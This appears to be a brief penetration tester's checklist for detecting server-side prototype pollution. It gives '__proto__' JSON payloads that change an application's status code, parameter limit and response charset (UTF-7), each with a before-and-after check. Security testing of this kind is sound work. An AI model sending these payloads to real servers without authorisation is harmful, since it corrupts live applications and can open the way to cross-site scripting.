
1- Manipulate Status code :
	-provide bad json body and check the response code , lets say its 400
	-send ""
	{
	    "__proto__":{
	        "status":555
	    }
	}
	-send the bad json body again and check if the status code changed

2-Parameter Limiting :
	- if GET params are reflect in response i.e ?test=123&man=234 and the body contain "test":"123","man":"234"
	- send
	{
	    "__proto__":{
	        "parameterLimit":1
	    }
	}

	- now sent the params again and check if both are reflected or only 1 

3-Content type
	- we need a param reflected in the response
	- craft a UTF-7 word i.e    "HelloWorld+ACEAIQAh-" which equals HelloWorld!!!
	- now send it and notice it reflected with out decoding
	- now send
	{
	    "__proto__":{
	        "content-type":"application/json; charset=utf-7"
	    }
	}
	
	now resend "HelloWorld+ACEAIQAh-" and check if its reflected the same or HelloWorld!!!